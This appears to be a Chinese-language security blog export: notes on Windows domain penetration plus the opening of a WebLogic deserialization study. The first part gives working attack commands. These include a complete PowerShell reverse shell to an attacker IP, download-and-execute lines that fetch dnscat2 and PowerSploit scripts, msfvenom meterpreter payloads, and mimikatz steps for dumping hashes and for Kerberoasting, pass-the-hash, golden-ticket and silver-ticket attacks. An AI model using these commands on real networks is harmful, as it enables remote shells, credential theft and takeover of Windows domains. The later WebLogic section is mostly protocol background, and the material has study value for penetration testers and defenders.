<h3 id="自定义payload"><a href="#自定义payload" class="headerlink" title="自定义payload"></a>自定义payload</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell -nop -c &quot;$client = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>&#x27;,<span class="number">6666</span>);$stream = $client.GetStream();</span><br><span class="line">[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;</span><br><span class="line">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );</span><br><span class="line">$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).<span class="built_in">Path</span> + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</span><br><span class="line">$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Reverse-DNS-Shell"><a href="#Reverse-DNS-Shell" class="headerlink" title="Reverse DNS Shell"></a>Reverse DNS Shell</h3><p>dnscat2：<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">ruby dnscat2.rb --dns &quot;domain=lltest.com,host=<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>&quot; --no-cache -e open</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">powershell IEX (New-Object System.<span class="built_in">Net</span>.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;);<span class="built_in">Start</span>-Dnscat2 -Domain lltest.com -DNSServer <span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span></span><br></pre></td></tr></table></figure>

<h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p>PowerSploit：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> lport=<span class="number">6667</span> -f dll -o /var/www/html/PowerSploit/lltest.dll</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">Get-Process #选择要注入的进程 Id</span><br><span class="line">IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span>/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)</span><br><span class="line">Invoke-DllInjection -ProcessID <span class="number">5816</span> -Dll C:UsersAdministratorDesktoplltest.dll</span><br></pre></td></tr></table></figure>

<h3 id="MSF-Reverse-Shell"><a href="#MSF-Reverse-Shell" class="headerlink" title="MSF Reverse Shell"></a>MSF Reverse Shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">255</span>.<span class="number">128</span> LPORT=<span class="number">4444</span> -f exe -o tcpshell.exe</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">tcpshell.exe</span><br></pre></td></tr></table></figure>



<h2 id="信息收集（简）"><a href="#信息收集（简）" class="headerlink" title="信息收集（简）"></a>信息收集（简）</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all    </span><br><span class="line"># 查询本机IP段，所在域等</span><br><span class="line"><span class="built_in">net</span> config Workstation    </span><br><span class="line"># 当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line"><span class="built_in">net</span> user    </span><br><span class="line"># 本机用户列表</span><br><span class="line"><span class="built_in">net</span> localgroup administrators    </span><br><span class="line"># 本机管理员[通常含有域用户]</span><br><span class="line"><span class="built_in">net</span> user /domain    </span><br><span class="line"># 查询域用户</span><br><span class="line"><span class="built_in">net</span> user 用户名 /domain    </span><br><span class="line"># 获取指定用户的账户信息</span><br><span class="line"><span class="built_in">net</span> user /domain b404 pass    </span><br><span class="line"># 修改域内用户密码，需要管理员权限</span><br><span class="line"><span class="built_in">net</span> group /domain    </span><br><span class="line"># 查询域里面的工作组</span><br><span class="line"><span class="built_in">net</span> group 组名 /domain    </span><br><span class="line"># 查询域中的某工作组</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain    </span><br><span class="line"># 查询域管理员列表</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain    </span><br><span class="line"># 查看域控制器(如果有多台)</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain    </span><br><span class="line"># 判断主域，主域服务器都做时间服务器</span><br><span class="line"><span class="built_in">ipconfig</span> /all    </span><br><span class="line"># 查询本机IP段，所在域等</span><br></pre></td></tr></table></figure>



<h2 id="Kereros-协议（简）"><a href="#Kereros-协议（简）" class="headerlink" title="Kereros 协议（简）"></a>Kereros 协议（简）</h2><ul>
<li>客户机将明文密码进行NTLM哈希，然后和时间戳一起加密（使用KRBTGT密码hash作为密钥），发送给KDC（域控），KDC对用户进行检测，成功之后创建TGT（票据授权票据）</li>
<li>将TGT进行加密签名返回给客户机器，只有域用户KRBTGT才能读取Kerberos中TGT数据</li>
<li>然后客户机将TGT发送给KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</li>
<li>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</li>
</ul>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="Kerberoating"><a href="#Kerberoating" class="headerlink" title="Kerberoating"></a>Kerberoating</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令（无法用于远程连接）。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>暴力破解</li>
</ol>
<h4 id="手工导出"><a href="#手工导出" class="headerlink" title="手工导出"></a>手工导出</h4><ol>
<li><p>获取有价值的SPN</p>
<ol>
<li><p>使用powershell模块Active Directory</p>
<blockquote>
<p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
<p>导入命令：</p>
<p>import-module .\Microsoft.ActiveDirectory.Management.dll</p>
<p>下载地址：</p>
<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq <span class="number">1</span> -and (servicePrincipalName -ne <span class="number">0</span>)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用PowerView</p>
<p>脚本地址：</p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用kerberoast</p>
<p>脚本地址：</p>
<p>（powershell）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
<p>（vbs）<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>请求TGS，执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS。</p>
<ol>
<li><p>请求指定TGS</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$SPNName = &#x27;MSSQLSvc/DC1.test.com&#x27;</span><br><span class="line">Add-<span class="built_in">Type</span> -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>
</li>
<li><p>请求所有TGS</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Add-<span class="built_in">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | Select-String &#x27;^CN&#x27; -Context <span class="number">0</span>,<span class="number">1</span> | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[<span class="number">0</span>].Trim() &#125;  </span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>导出TGS</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::list /export</span><br></pre></td></tr></table></figure>
</li>
<li><p>破解</p>
<p>脚本地址：</p>
<p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">./tgsrepcrack.py wordlist.txt test.kirbi</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h4><p>自动实现，并且不需要mimikatz，普通用户权限即可</p>
<p>参考资料：</p>
<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p>代码地址：</p>
<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p><strong>利用步骤</strong></p>
<ol>
<li><p>在域内一台主机上以普通用户权限执行</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>
</li>
<li><p>只提取hash参数</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用hashcat破解</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hashcat -m <span class="number">13100</span> /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Pth（Pass-the-hash）"><a href="#Pth（Pass-the-hash）" class="headerlink" title="Pth（Pass the hash）"></a>Pth（Pass the hash）</h3><p>直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ul>
<li>在Windows系统中，通常会使用NTLM身份认证</li>
<li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
<li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
<li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
</ul>
<h4 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h4><ul>
<li>域&#x2F;工作组环境</li>
<li>可以获得hash，但是条件不允许对hash爆破</li>
<li>内网中存在和当前机器相同的密码</li>
</ul>
<blockquote>
<p>微软对 Pth 打过补丁，但是默认的 Administrator(SID 500) 账号还可以使用 Pth。</p>
<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。</p>
</blockquote>
<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p>
<p>对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012，可以使用AES keys代替NT hash</p>
</blockquote>
<p>获取 hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>pth</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:[Username] /domain:workgroup /ntlm:[NTLM]</span><br></pre></td></tr></table></figure>

<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p><strong>Invoke-TheHash</strong></p>
<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Invoke-Module Invoke-TheHash.psd1Invoke-WMIExec -Target <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</span><br></pre></td></tr></table></figure>

<p><strong>Invoke-SMBExec</strong></p>
<blockquote>
<p>支持SMB1，SMB2 (2.1)，and SMB signing，</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</span><br></pre></td></tr></table></figure>

<p><strong>Invoke-SMBClient</strong></p>
<blockquote>
<p>支持SMB1, SMB2 (2.1), and SMB signing，如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本。</p>
<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
</blockquote>
<p><strong>wmiexec.py</strong></p>
<p><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p>
<p><strong>wmiexec.exe</strong></p>
<p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<blockquote>
<p>wmiexec.exe通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wmiexec -hashes <span class="number">00000000000000000000000000000000</span>:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>wmiexec.py的hash参数格式为 LM Hash:NT Hash ，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值</p>
</blockquote>
<h3 id="Ptt（Pass-the-ticket）"><a href="#Ptt（Pass-the-ticket）" class="headerlink" title="Ptt（Pass the ticket）"></a>Ptt（Pass the ticket）</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限。</p>
<p>利用Kerberos协议进行攻击，三种常用的攻击方法是MS16-068，Golden ticket，Silver ticket。</p>
<h4 id="MS16-068"><a href="#MS16-068" class="headerlink" title="MS16-068"></a>MS16-068</h4><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心（KDC）中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p>
<blockquote>
<p>ms14-068详细介绍：<a href="https://www.freebuf.com/vuls/56081.html">https://www.freebuf.com/vuls/56081.html</a></p>
<p>微软给出的补丁是kb3011780</p>
</blockquote>
<p>简单来说就是：</p>
<p>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</p>
<ol>
<li>在请求AS时，将require_PAC设置成False。</li>
<li>在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</li>
<li>TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT。</li>
</ol>
<p><strong>利用工具</strong></p>
<p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">ms14-068</a></p>
<p><strong>利用步骤</strong></p>
<ol>
<li><p>使用 whoami&#x2F;user 得到普通域用户的sid</p>
</li>
<li><p>执行payload生成TGT票据（.ccache文件）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br></pre></td></tr></table></figure>
</li>
<li><p>票据注入，使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器，成功后会显示<code>Injecting ticket : OK</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>利用工具</strong> </p>
<p><a href="https://github.com/gentilkiwi/kekeo/releases">kekeo</a></p>
<p><strong>利用步骤</strong></p>
<ol>
<li><p>生成票据</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">kekeo # &quot;tgt::ask /user:mary /domain:god.org /ntlm:<span class="number">518</span>b98ad4178a53695dc997aa02d455c&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>导入票据</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">kekeo # &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="Golden-ticket"><a href="#Golden-ticket" class="headerlink" title="Golden ticket"></a>Golden ticket</h4><p><strong>前提条件</strong></p>
<ul>
<li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li>
<li>域名称</li>
<li>域的SID值</li>
<li>要伪造的用户名</li>
</ul>
<p><strong>利用步骤</strong></p>
<ol>
<li><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
</li>
<li><p>切换到普通域用户的机器，生成TGT凭证,用户名为administrator</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::golden /user:administrator /doamin::dog.org /sid:[SID] /krbigi:[NTLM]</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用mimikatz将凭证注入进去</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果主机开启了RPC服务，还可以使用WmiExec.vbs直接连接：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cscript &quot;wmiexe v1.<span class="number">1</span>.vbs&quot; /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="Silver-ticket"><a href="#Silver-ticket" class="headerlink" title="Silver ticket"></a>Silver ticket</h4><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p>
<p><strong>利用步骤</strong></p>
<ol>
<li><p>首先登录域控，dump机器hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
</li>
<li><p>将hash保存下来，在普通域用户机器中进行ptt</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:god.org /sid:[SID]  /target:<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> /rc4:[NTLM]  /service:cifs /user:mary /ptt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</p>
</blockquote>
</li>
</ol>
<h3 id="Ptk（Pass-the-key）"><a href="#Ptk（Pass-the-key）" class="headerlink" title="Ptk（Pass the key）"></a>Ptk（Pass the key）</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key（使用sekurlsa::ekeys导出来），就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p>
<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol>
<li><p>获取用户的aes key</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注入aes key</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:[aes256_hmac]&quot; </span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>如果拒绝访问的话尝试安装kb2871997补丁</p>
</blockquote>
<h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><blockquote>
<p>NTLM(v1&#x2F;v2)的hash是存放在安全账户管理(SAM)数据库以及域控的NTDS.dit数据库中，获取该Hash值可以直接进行PtH攻击。</p>
<p>Net-NTLM(v1&#x2F;v2)的hash值是基于用户的NT的hash值经过一定的算法产生的。</p>
<p>区别：</p>
<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
<p>Net-NTLM v2 hash需要暴力破解（hashcat）</p>
</blockquote>
<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在使用一些服务的过程中，需要带有windows的自身的认证信息，其实就是Net-NTLM的Hash，而这些东西你可以使用像Responder或者Inveigh这些工具获得。然后你获取了这个Net-NTLM的Hash，就可以转给真正的验证服务器去验证，从而作为攻击者的你就可以通过真实的服务器的身份验证，这种攻击方式就称作NTLM中继攻击。</p>
<h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><ul>
<li>Responder：<a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li>
<li>Inveigh：<a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></li>
<li>smbrealyx：<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py</a></li>
</ul>
<p>参考链接：</p>
<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
<p><a href="https://www.anquanke.com/post/id/171552#h2-6">Kerberos协议探索系列之扫描与爆破篇</a></p>
<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">域渗透——Kerberoasting</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
]]></content>
      <tags>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic反序列化漏洞研究</title>
    <url>/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<blockquote>
<p>搜集和分析关于WebLogic的反序列化漏洞</p>
</blockquote>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>序列化数据特征</strong></p>
<p>对weblogic在7001端口的T3协议进行抓包，可以发现java序列化之后数据的Magic头<code>ac ed 00 05</code>，其编码后是<code>rO0ABQ==</code></p>
<p><strong>使用场景</strong></p>
<ol>
<li>http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等</li>
<li>ServletsHTTP，Sockets，Session管理器包含的协议，包括JMX，RMI，JMS，JNDI等</li>
<li>xmlXstream，XMLDecoder等</li>
<li>json，包括Jackson，fastjson等</li>
</ol>
<p><strong>反序列化攻击时序图</strong></p>
<p>Java应用的反序列化流程</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105221529bd01a07b7dcb57cfbb91.png" alt="image-20210522152846833" style="zoom: 67%;" />

<p><strong>反序列化流程图</strong></p>
<p>WebLogic进行反序列化的执行流程图</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127195915def76095470f1ec5fe.png" alt="img"></p>
<blockquote>
<p>实现了<code>External</code>接口的对象会调用<code>readExternal()</code>函数，实现了<code>Serialize</code>接口的对象会调用<code>readObject()</code>函数</p>
<p>使用<code>Proxy</code>类封装的对象会调用<code>readProxyClass()</code>函数，否则会调用<code>readClass()</code>函数</p>
<p>如果对象中存在<code>readResolve()</code>函数会自动执行它</p>
<p>weblogic的黑名单检查放置在<code>resolveProxyClass()</code>和<code>resolveClass()</code>函数中，函数为<code>ClassFilter.isBlackListed()</code></p>
</blockquote>
<p><strong>漏洞分类</strong></p>
<p>WebLogic反序列化高危漏洞主要分为java反序列化和xml反序列化，其中java发序列化可通过T3协议和IIOP协议触发，下面的漏洞分析也是根据这两大方面分隔展示</p>
<h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><p><strong>反射机制</strong></p>
<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
<p><strong>RMI和JRMP协议</strong></p>
<p>RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样，RMI传输过程都使用序列化和反序列化。RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。</p>
<p><strong>CORBA</strong></p>
<p>CORBA（Common Object Request Broker Architecture，公共对象请求代理体系结构）是跨语言（C ++、Java等）的通信体系结构，通常在 IIOP 协议中使用。</p>
<p><strong>GIOP协议</strong></p>
<p>GIOP（General Inter-ORB Protocol，通用对象请求代理间通信协议）是分布式计算领域的一种抽象协议，负责ORB的通信。</p>
<p><strong>IIOP协议</strong></p>
<p>IIOP（Internet Inter-ORB Protocol，互联网内部对象请求代理协议），用来在CORBA对象请求代理之间交流的协议，实现Java和其他语言的CORBA的互操作。</p>
<p><strong>RMI-IIOP协议</strong></p>
<p>兼容了RMI和IIOP的实现，解决RMI和CORBA&#x2F;IIOP无法同时使用的技术方案。</p>
<p><strong>T3协议</strong></p>
<p>WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。</p>
<p><strong>IDL</strong></p>
<p>IDL（Interface Definition Language，接口定义语言）主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p>
<p><strong>JAVA IDL</strong></p>
